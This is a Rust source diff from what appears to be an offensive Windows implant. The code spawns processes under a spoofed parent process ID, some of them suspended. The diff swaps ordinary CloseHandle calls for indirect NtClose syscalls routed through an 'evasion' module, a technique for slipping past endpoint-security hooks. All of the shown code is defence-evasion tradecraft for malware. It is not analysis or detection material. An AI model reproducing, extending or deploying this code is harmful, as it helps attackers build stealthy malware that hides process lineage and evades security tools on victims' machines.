@@ -9,7 +9,6 @@ use windows_sys::Win32::{
         PROCESS_CREATE_PROCESS, PROCESS_QUERY_INFORMATION,
         STARTUPINFOA, LPPROC_THREAD_ATTRIBUTE_LIST,
     },
-    Foundation::CloseHandle,
 };
 
 #[cfg(target_os = "windows")]
@@ -81,7 +80,9 @@ pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(
     );
 
     DeleteProcThreadAttributeList(attr_buf.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST);
-    CloseHandle(h_parent);
+    if let Some((ssn_c, tramp_c)) = crate::evasion::syscalls::get_ssn(b"NtClose") {
+        crate::evasion::syscalls::indirect_syscall(ssn_c, tramp_c, h_parent as usize, 0, 0, 0, 0, 0);
+    }
 
     if ok == 0 { return None; }
     Some((pi.hProcess, pi.hThread))
@@ -105,7 +106,6 @@ pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> 
     use windows_sys::Win32::System::Threading::{
         CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, CREATE_SUSPENDED,
     };
-    use windows_sys::Win32::Foundation::CloseHandle;
     let mut si: STARTUPINFOA = core::mem::zeroed();
     si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
     let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
@@ -144,20 +144,25 @@ unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
         CreateToolhelp32Snapshot, Process32First, Process32Next,
         TH32CS_SNAPPROCESS, PROCESSENTRY32,
     };
+    let nt_close_s = |h: isize| {
+        if let Some((sc, tc)) = crate::evasion::syscalls::get_ssn(b"NtClose") {
+            crate::evasion::syscalls::indirect_syscall(sc, tc, h as usize, 0, 0, 0, 0, 0);
+        }
+    };
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if snap == 0 { return None; }
     let mut entry: PROCESSENTRY32 = core::mem::zeroed();
     entry.dwSize = core::mem::size_of::<PROCESSENTRY32>() as u32;
-    if Process32First(snap, &mut entry) == 0 { CloseHandle(snap); return None; }
+    if Process32First(snap, &mut entry) == 0 { nt_close_s(snap); return None; }
     loop {
         let max_len = name.len().min(entry.szExeFile.len());
         let exe_slice = &entry.szExeFile[..max_len];
         if exe_slice.iter().zip(name.iter()).all(|(&a, &b)| a == b as u8) {
-            CloseHandle(snap);
+            nt_close_s(snap);
             return Some(entry.th32ProcessID);
         }
         if Process32Next(snap, &mut entry) == 0 { break; }
     }
-    CloseHandle(snap);
+    nt_close_s(snap);
     None
 }
